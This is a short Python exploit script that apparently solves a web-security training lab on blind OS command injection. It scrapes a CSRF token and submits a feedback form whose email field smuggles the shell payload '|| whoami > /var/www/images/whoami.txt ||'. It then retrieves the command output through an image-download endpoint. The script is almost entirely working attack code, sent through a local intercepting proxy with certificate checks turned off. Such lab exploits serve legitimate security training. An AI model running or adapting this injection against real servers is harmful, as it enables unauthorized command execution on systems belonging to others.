import requests
import sys
import urllib3
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

# get csrf token
def get_csrf_token(s, url):
    r = s.get(url + "/feedback", verify=False)
    soup = BeautifulSoup(r.text, "html.parser")
    csrf = soup.find("input", {"name": "csrf"})
    token = csrf["value"]
    #print(f"CSRF token: {token}")
    return token

# command injection
def injection(s, url):
    print("[*] Attempting command injection")
    feedback_url = url + "/feedback/submit"
    csrf = get_csrf_token(s, url)
    payload = "|| whoami > /var/www/images/whoami.txt || "
    data = {"csrf" : f"{csrf}", "name": "test", "email": f"test@test.com{payload}", "subject": "test", "message": "test"}
    r = s.post(feedback_url, data=data, verify=False, allow_redirects=True, proxies=proxies)
    results = s.get(url + "/image?filename=whoami.txt")
    output = results.text.strip()
    if results: 
        print(f"[+] Command injection successful: whoami: {output}")
        print("[+] Lab solved.")
    else:
        print("[-] Error with command injection")
       


def main():
    if len(sys.argv) != 2:
        print(f"[+] Usage: {sys.argv[0]} <url>")
        sys.exit(0)

    s = requests.Session()
    url = sys.argv[1].strip().rstrip("/")
    injection(s, url)

if __name__=="__main__":
    main()